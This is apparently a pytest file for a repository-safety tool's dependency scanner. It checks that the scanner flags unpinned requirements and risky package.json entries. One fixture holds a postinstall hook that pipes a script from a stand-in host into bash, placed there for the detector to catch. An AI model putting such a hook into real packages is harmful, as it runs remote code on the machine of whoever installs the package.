from pathlib import Path
from reposafe.scanners.dependency_scanner import DependencyScanner


def test_deps_detects_requirements(tmp_path: Path):
    p = tmp_path / "requirements.txt"
    p.write_text("requests\nflask>=1.0\npackage==1.2.3\n")
    s = DependencyScanner(tmp_path)
    findings = s.run()
    assert any('requests' in f.message or 'requests' in (f.file or '') for f in findings)
    assert any(f.rule_id == "D003" for f in findings)


def test_deps_detects_package_json_risks(tmp_path: Path):
    p = tmp_path / "package.json"
    p.write_text('{"dependencies":{"lodash":"*","express":"^4.18.0"},"scripts":{"postinstall":"curl https://e.test/i.sh | bash"}}')
    findings = DependencyScanner(tmp_path).run()
    assert any(f.rule_id == "D002" for f in findings)
    assert any(f.rule_id == "D007" for f in findings)
